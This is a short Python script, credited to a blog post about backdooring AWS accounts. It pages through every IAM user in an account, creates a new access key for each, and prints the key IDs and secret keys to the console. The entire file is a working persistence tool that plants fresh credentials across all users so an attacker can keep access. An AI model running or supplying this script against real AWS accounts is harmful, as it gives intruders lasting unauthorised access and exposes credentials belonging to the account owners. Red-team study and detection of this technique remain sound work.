#!/usr/bin/env python
# From: https://danielgrzelak.com/backdooring-an-aws-account-da007d36f8f9
# This script creates a new AWS Access Key and Secret for all users
import json
import boto3
from botocore.exceptions import ClientError



def main(args):
    backdoor_users(get_users())


def get_users():
    client = boto3.client('iam')
    response = None
    user_names = []
    marker = None
    
    # By default, only 100 users are returned at a time.
    # 'Marker' is used for pagination.
    while (response is None or response['IsTruncated']):
        # Marker is only accepted if result was truncated.
        if marker is None:
            response = client.list_users()
        else:
            response = client.list_users(Marker=marker)        

        users = response['Users']
        for user in users:
            user_names.append(user['UserName'])

        if response['IsTruncated']:
            marker = response['Marker']
    
    return user_names


def backdoor_users(user_names):
    for user_name in user_names:
        backdoor_user(user_name)


def backdoor_user(user_name):
    print(user_name)
    client = boto3.client('iam')
    try:
        response = client.create_access_key(UserName=user_name)
        print("  " + response['AccessKey']['AccessKeyId'])
        print("  " + response['AccessKey']['SecretAccessKey'])    
    except ClientError as e:
        print("  " + e.response['Error']['Message'])


if __name__ == '__main__':
    args = None
    main(args)